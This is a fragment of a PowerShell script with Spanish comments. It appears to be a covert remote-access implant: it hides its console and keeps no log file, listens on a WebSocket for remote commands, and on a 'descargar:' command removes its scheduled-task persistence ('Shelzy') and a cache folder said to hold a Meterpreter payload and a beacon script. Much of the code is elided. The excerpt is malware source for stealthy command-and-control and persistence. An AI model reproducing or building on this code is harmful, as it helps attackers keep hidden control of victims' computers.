...
# --- Log SOLO a consola (que esta oculta): no se genera ningun archivo de log ---
    ...
    try {
        ...
        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
            ...
            if ($text -like "descargar:*") {
                ...
                # Borrar la persistencia: tarea programada "Shelzy" (creada por setup.cmd).
                try {
                    schtasks /delete /tn Shelzy /f 2>$null | Out-Null
                    Write-Log "tarea Shelzy eliminada"
                } catch { Write-Log "error borrando tarea Shelzy: $_" }
                # Borrar la carpeta Cache completa (setup.cmd, meterpreter, device.id, beacon.ps1...).
